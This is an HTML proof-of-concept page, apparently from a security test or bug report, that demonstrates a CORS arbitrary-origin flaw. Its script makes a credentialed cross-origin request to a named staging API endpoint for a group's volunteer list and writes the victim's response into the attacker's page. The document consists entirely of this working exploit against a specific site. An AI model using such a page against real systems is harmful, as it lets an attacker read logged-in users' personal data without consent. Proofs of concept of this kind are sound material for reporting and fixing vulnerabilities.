<html>

<head>
    <title>CORS Arbitrary Origin PoC</title>
</head>

<body>
    <div id="content"></div>
</body>
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://staging.vhelp.co.uk/api/groups/345/volunteers', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        document.getElementById('content').innerHTML = this.responseText;
    };
</script>

</html>
